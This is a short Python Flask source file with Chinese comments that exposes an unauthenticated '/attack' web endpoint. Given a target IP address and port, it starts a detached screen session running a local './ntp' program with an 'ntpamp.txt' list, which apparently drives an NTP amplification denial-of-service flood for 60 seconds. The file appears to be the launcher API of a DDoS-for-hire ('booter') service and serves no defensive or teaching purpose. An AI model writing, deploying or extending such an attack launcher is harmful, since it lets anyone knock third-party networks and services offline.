from flask import Flask, request, jsonify
import subprocess
import string
import random
import threading
import time
import os

app = Flask(__name__)

# 配置 Flask 监听的端口
PORT = 5000

def generate_screen_name(prefix="ntp_", length=8):
    """生成一个随机的 screen 名称"""
    chars = string.ascii_letters + string.digits
    return prefix + ''.join(random.choice(chars) for _ in range(length))

def validate_ip(ip):
    """简单的 IP 地址验证"""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for item in parts:
        if not item.isdigit():
            return False
        num = int(item)
        if num < 0 or num > 255:
            return False
    return True

def validate_port(port):
    """简单的端口号验证"""
    if not port.isdigit():
        return False
    num = int(port)
    return 1 <= num <= 65535

@app.route('/attack', methods=['GET'])
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')

    # 验证参数
    if not ip or not port:
        return jsonify({"error": "Missing 'ip' or 'port' parameter"}), 400

    if not validate_ip(ip):
        return jsonify({"error": "Invalid IP address"}), 400

    if not validate_port(port):
        return jsonify({"error": "Invalid port number"}), 400

    # 生成随机的 screen 名称
    screen_name = generate_screen_name()

    # 构建要执行的命令
    # 使用 timeout 确保命令在 60 秒后终止
    command = f"timeout 60s ./ntp {ip} {port} ntpamp.txt 1000 -1 60"

    # 启动 screen 会话并在其中执行命令
    try:
        subprocess.Popen(['screen', '-dmS', screen_name, 'bash', '-c', command])
    except Exception as e:
        return jsonify({"error": f"Failed to start attack: {str(e)}"}), 500

    return jsonify({"message": f"Attack started with screen session '{screen_name}'"}), 200

if __name__ == '__main__':
    # 确保 ntp 脚本具有执行权限
    if not os.access('./ntp', os.X_OK):
        print("Error: './ntp' is not executable or not found.")
        exit(1)

    # 启动 Flask 应用
    app.run(host='0.0.0.0', port=PORT)
